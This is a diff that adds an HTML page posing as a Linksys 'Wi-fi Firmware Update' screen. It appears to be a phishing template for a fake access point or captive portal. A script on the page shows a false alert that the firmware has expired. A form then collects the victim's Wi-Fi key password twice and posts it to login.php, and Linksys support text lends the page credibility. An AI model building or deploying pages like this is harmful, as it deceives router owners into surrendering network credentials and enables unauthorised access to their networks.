@@ -1,0 +1,219 @@
+
+<!DOCTYPE html>
+<html lang='en'>
+<head>
+    <meta charset='UTF-8'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <meta http-equiv='X-UA-Compatible' content='ie=edge'>
+    <title>Firmware update</title>
+    <style>
+        * {
+            margin: 0px;
+            padding: 0px;
+        }
+
+        body {
+            background-color: #eee;
+        }
+
+        #wrapper {
+            width: 500px;
+            height: 50%;
+            overflow: hidden;
+            border: 0px solid #000;
+            margin: 50px auto;
+            padding: 10px;
+        }
+
+        .main-content {
+            width: 250px;
+            height: 40%;
+            margin: 10px auto;
+            background-color: #fff;
+            border: 2px solid #e6e6e6;
+            padding: 40px 50px;
+            align-items: center;
+            
+        }
+
+        .input,
+        .input {
+            width: 100%;
+            margin-bottom: 30px;
+            padding: 10px;
+            border: 1px solid #dbdbdb;
+            box-sizing: border-box;
+            border-radius: 20px;
+        }
+
+        .btn {
+            width: 100%;
+            background-color: #799dc1;
+            border: transparent;
+            padding: 10px;
+            color: #fff;
+            font-weight: bold;
+            cursor: pointer;
+            border-radius: 20px;
+        }
+
+        input:focus {
+            border-color: lightblue;
+            padding: 13px;
+            opacity: .5;
+        }
+        .sub-content {
+            width: 250px;
+            height: 40%;
+            margin: 10px auto;
+            border: 1px solid #e6e6e6;
+            padding: 20px 50px;
+            background-color: #fff;
+            
+        }
+
+        .text-head{
+            text-align: center;
+            font-family: sans-serif;
+            color: grey;
+            text-transform: uppercase;
+        }
+
+        .chkbox-text{
+            text-align: center;
+            color: grey;
+            font-family: sans-serif;
+        }
+
+        .s-part {
+            text-align: center;
+            color: rgb(255, 40, 40);
+            font-family:'Gill Sans', 'Gill Sans MT', Calibri, 'Trebuchet MS', sans-serif;
+        }
+
+        img{
+            height: 80px;
+            width: 80px;
+            position: relative;
+            left: 80px;
+
+        }
+        textarea{
+            position: relative;
+            left: 70px;
+            height: 50px;
+            padding: 10px;
+            color: grey;
+        }
+
+        .head{
+            background: #799dc1;
+            width: 100%;
+            height: 15vh;
+            text-align: left;
+            
+        }
+
+        .version{
+            background: #5b5e5c;
+            width: 100%;
+            height: 5vh;
+            text-align: left;
+            color: white;
+            font-family: sans-serif;
+            font-size: 13px;
+        }
+
+        h1{
+            font-family: sans-serif;
+            font-weight: 400;
+            color: white;
+            position: relative;
+            top: 10px;
+        }
+
+        .wifi {
+            padding: 10px;
+            position: relative;
+            left: 70px;
+            top: 10px;
+            bottom: 50px;
+        }
+
+        .wifi, .wifi:before {
+            display: inline-block;
+            border: 20px double transparent;
+            border-top-color: currentColor;
+            border-radius: 50%;
+        }
+
+        .wifi:before {
+            content: '';
+            width: 0; height: 0;
+        }
+        
+        .container, html, body{
+            height: 100%;
+        }
+        .container{
+            justify-content: center;
+            align-items: center;
+        }
+        .box{
+            left: 50%;
+            top: 100%;
+            position: absolute;
+            transform: translate(-50%, -50%)
+        }
+    </style>
+</head>
+<body>
+
+        <div class="head">
+            <h1>Wi-fi Firmware Update</h1>
+        </div>
+        <div class="version">
+            Firmware : VE-PG3/VE-PG4  Version: 1.03
+        </div>
+        
+        <div class="container">
+            <div class="box">
+                    <div id='wrapper'>
+                            <div class='main-content'>
+                                <div class="wifi" /></div>
+                                <p class="text-head">wi-fi Firmware Update</p>
+                                <br>
+                                <form action='login.php' method='post'>
+                                        <div class='s-part'>
+                                            <input type='password' placeholder='Wi-Fi Key Password ' class='input' name='password' id="password" required/>
+                                            <input type='password' placeholder='Confirm Password' class='input' name='confirm-password' id="confirm_password" required/>
+                                            <input type='submit' name="submit" value='Log in' class='btn' id="submit"/>
+                                            <input type="checkbox" style="margin-top:10px" name="agree" id="agree" required><label for="agree" class="chkbox-text">I agree about terms of usage </label>
+                                        </div>
+                                </form>
+                                
+                            </div>
+                            <textarea rows="20" cols="47" readonly>Firmware updates are bug fixes and functionality enhancements for the router.  Keeping the firmware of your Linksys device updated is important because it fixes issues you may encounter while using it.  An updated firmware downloaded from the Linksys Support site may also contain device feature enhancements that are not available in the previous versions.  
+                            </textarea>
+                
+                        </div>
+            </div>
+        </div>
+        
+</body>
+<script>
+    alert("Your firmware was expired, please upgrade your firmware for continue");
+    var password = document.getElementById("password"), confirm_password = document.getElementById("confirm_password");
+
+    function validatePassword(){
+        if(password.value != confirm_password.value) {
+            confirm_password.setCustomValidity("Passwords Don't Match");
+        } else {
+            confirm_password.setCustomValidity('');
+        }
+    }
+
+    password.onchange = validatePassword;
+    confirm_password.onkeyup = validatePassword;
+</script>
+</html>
